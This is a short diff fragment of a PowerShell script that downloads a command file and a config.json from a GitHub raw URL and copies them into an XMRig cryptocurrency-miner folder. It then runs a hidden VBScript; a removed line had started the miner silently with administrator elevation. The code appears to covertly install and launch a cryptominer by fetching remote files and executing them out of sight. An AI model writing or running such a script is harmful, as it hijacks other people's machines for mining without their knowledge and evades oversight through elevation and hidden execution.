@@ -11,6 +11,5 @@ Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/head
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/GALVINVN/coin/refs/heads/main/config.json -OutFile C:\config.json
 Copy-Item -Path C:\XRPRUN.cmd -Destination C:\xmrig-6.22.2\XRPRUN.cmd -Force
 Copy-Item -Path C:\config.json -Destination C:\xmrig-6.22.2\config.json -Force
-Start-Process -FilePath 'C:\xmrig-6.22.2\XRPRUN.cmd' -ArgumentList '/S' -Verb RunAs
 Start-Process -FilePath "wscript.exe" -ArgumentList "C:\hid.vbs"
 powershell.exe exit
